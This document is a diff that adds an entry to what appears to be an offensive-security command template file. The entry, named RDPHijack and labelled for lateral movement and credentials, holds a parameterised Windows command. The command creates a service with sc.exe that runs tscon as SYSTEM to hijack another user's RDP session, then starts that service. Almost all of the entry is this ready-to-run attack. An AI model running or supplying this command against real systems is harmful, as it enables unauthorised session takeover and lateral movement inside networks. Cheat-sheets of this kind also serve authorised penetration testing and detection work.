@@ -1,0 +1,19 @@
+---
+projectLink: 
+name: RDPHijack
+params:
+- name: ServiceName
+  description: name of service that will be created
+- name: TargetSessionNumber
+  description: the number of the session to hijack
+- name: CurrentRDPSessionNumber
+  description: the number of the current RDP session
+
+sections:
+- name: Hijack RDP Session (run command as system)
+  labels: ['Lateral', 'Creds']
+  commands:
+  - language: EXE
+    command: |-
+      Sc.exe create {{ServiceName}} binpath="cmd.exe /k tscon {{TargetSessionNumber}} /dest:rdp-tcp#{{CurrentRDPSessionNumber}}"
+      net start {{ServiceName}}
